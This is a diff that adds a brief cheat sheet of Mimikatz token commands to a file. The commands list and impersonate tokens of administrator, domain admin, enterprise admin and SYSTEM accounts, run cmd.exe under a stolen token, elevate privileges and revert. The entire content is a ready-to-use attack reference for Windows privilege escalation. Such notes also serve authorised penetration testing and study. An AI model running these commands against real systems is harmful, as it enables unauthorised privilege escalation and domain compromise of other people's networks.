@@ -1,0 +1,27 @@
+MIMIKATZ - TOKENS
+Show who you are 
+
+token::whoami
+
+Show other tokens:
+
+token::list /user:administrator
+token::list /user:domainadmin
+token::list /user:enterpriseadmin
+token::list /user:system\
+token::list /user:bob123
+
+Run process with a token:
+
+token::run /process:cmd.exe
+
+Get those privileges:
+
+token::elevate
+
+Revert Token:
+
+token::revert
+
+
+
